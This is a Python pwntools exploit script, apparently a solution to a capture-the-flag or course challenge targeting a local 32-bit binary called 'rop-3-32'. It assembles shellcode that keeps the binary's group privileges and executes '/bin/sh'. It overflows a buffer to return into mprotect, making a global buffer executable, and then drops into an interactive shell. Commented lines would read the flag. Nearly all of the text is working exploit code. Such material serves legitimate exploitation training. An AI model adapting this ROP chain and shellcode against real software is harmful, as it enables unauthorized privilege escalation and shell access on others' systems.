from pwn import *
import os

DEBUG = False 
file = "./rop-3-32"
env = {"PATH":"$PATH:."}

elf = ELF(file)

max_len = 0x9c

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *input_func
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE
shellcode = asm('''
mov    eax,0x32
int    0x80
mov    ebx,eax
mov    ecx,eax
mov    eax,0x47
int    0x80
mov    ecx,0x0
mov    edx,0x0
mov    eax,0xb
push   0x0
push   0x68732f6e
push   0x69622f2f
mov    ebx,esp
int    0x80
''')


mprotect = p32(elf.symbols["mprotect"])
read = p32(elf.symbols["read"])
global_area =  p32(0x804a000)
shellcode_addr = p32(elf.symbols["g_buf"])
pop_3 = p32(0x080485a8)

payload = flat (
    shellcode,
    (max_len - len(shellcode)) * b"A",
    mprotect,
    shellcode_addr,
    global_area,
    p32(0x1000),
    p32(7),
    # read,
    # shellcode_addr,
    # p32(1),
    # shellcode_addr,
    # p32(0x100),
)

io.sendline(payload)

io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
